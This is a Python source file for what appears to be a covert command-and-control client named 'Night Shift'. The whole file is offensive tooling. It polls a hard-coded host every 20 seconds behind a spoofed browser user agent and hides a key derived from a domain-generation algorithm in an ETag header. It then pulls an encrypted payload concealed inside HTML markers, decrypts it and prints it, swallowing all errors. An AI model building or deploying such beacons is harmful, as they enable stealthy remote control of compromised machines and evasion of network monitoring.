#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Night Shift Client
#
import aiohttp
import asyncio
import os
import sys
import time

from nightshift_dga import NightShift_DGA
from nightshift_cipher import NightShift_Cipher

async def main():

    async with aiohttp.ClientSession() as session:
        ns_url = 'http://192.168.254.82:8080/latestgadgets/top/picks'
        ns_get_key = NightShift_DGA()
        ns_get_cipher = NightShift_Cipher()
        ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
        ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
        #print(ns_hdr_key)
        #print(ns_hsh_key)
        ns_hdrs = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/84.0',
                'ETag': ns_hsh_key
                 }
        async with session.get(ns_url, headers=ns_hdrs) as response:
            #print("Status:", response.status)
            #print("Content-type:", response.headers['content-type'])
            html = await response.text()
            #print("Body:", html, "...")
        return html

if __name__ == "__main__":
    ns_get_cipher = NightShift_Cipher()
    while True:
        try:
            loop = asyncio.get_event_loop()
            html = loop.run_until_complete(main())
            #print(html)
            ns_payload = ((html.split('HTMLDOC:'))[1].split('HTMLDOC')[0])
            ns_decrypt_payload = ns_get_cipher.decrypt(ns_payload)
            print(ns_payload)
            print(ns_decrypt_payload) 
        except:
            pass
        time.sleep(20)
# "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 noctis_subcinctus_client"
